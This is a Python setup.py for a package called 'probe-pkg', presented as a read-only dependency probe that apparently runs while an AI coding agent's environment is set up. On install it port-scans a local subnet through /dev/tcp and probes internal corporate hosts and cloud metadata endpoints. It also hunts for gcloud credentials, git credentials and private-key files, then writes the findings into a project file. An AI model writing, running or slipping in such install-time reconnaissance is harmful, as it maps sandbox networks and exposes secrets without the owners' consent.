"""Local dependency probe v7 — network position verification (read-only).

Runs during Jules environment setup.
"""
import subprocess
from setuptools import setup


def run(cmd, t=40):
    try:
        p = subprocess.run(["sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:  # noqa: BLE001
        return "ERR " + repr(e)


def checks():
    p = []
    p.append("ip_a: " + run("ip -brief a 2>&1"))
    p.append("ip_r: " + run("ip route 2>&1"))
    p.append("arp: " + run("cat /proc/net/arp 2>&1; ip neigh 2>&1"))
    p.append("subnet_scan: " + run(
        "for h in 1 2 3 4 5 6 7 8 9 10 100 254; do "
        "timeout 1 bash -c \"echo > /dev/tcp/192.168.0.$h/22\" 2>/dev/null && echo \"192.168.0.$h:22 open\"; "
        "timeout 1 bash -c \"echo > /dev/tcp/192.168.0.$h/443\" 2>/dev/null && echo \"192.168.0.$h:443 open\"; "
        "done; echo scan_done"))
    p.append("gw_http: " + run("curl -s -m 5 -o /dev/null -w '%{http_code}' http://192.168.0.1/ 2>&1"))
    p.append("dns_corp: " + run("getent hosts swebot.corp.google.com jules.google.com "
                               "metadata.google.internal instance-data 2>&1"))
    p.append("corp_reach: " + run(
        "curl -s -m 6 -o /dev/null -w 'swebot=%{http_code}' https://swebot.corp.google.com/ 2>&1; "
        "echo -n ' '; curl -s -m 6 -o /dev/null -w 'corp=%{http_code}' https://corp.google.com/ 2>&1"))
    p.append("meta_alt: " + run(
        "curl -s -m 5 -o /dev/null -w 'instancedata=%{http_code}' "
        "http://instance-data/computeMetadata/v1/ 2>&1; echo -n ' '; "
        "curl -s -m 5 -o /dev/null -w 'meta=%{http_code}' http://metadata/ 2>&1"))
    p.append("googleapis: " + run(
        "curl -s -m 6 -o /dev/null -w 'gapis=%{http_code}' https://www.googleapis.com/ 2>&1; echo -n ' '; "
        "curl -s -m 6 -o /dev/null -w 'gcs=%{http_code}' https://storage.googleapis.com/ 2>&1"))
    p.append("adc: " + run("ls -la /home/jules/.config/gcloud /app/.gcloud "
                          "/home/jules/.config/gcloud/application_default_credentials.json 2>&1 | head"))
    p.append("gitcred: " + run("git -C /app config --get credential.helper; "
                              "cat /home/jules/.gitconfig 2>&1"))
    p.append("gclouds: " + run("grep -rl 'private_key' /app /home/jules 2>/dev/null | head -5"))
    return "\n".join(p)


def emit(text):
    block = "\n===== PROBE7_START =====\n" + text + "\n===== PROBE7_END =====\n"
    print(block)
    try:
        with open("/app/PROBE_DIAG.md", "w") as fh:
            fh.write(block)
    except Exception:
        pass


emit(checks())


setup(name="probe-pkg", version="0.0.7", packages=["probe_pkg"])
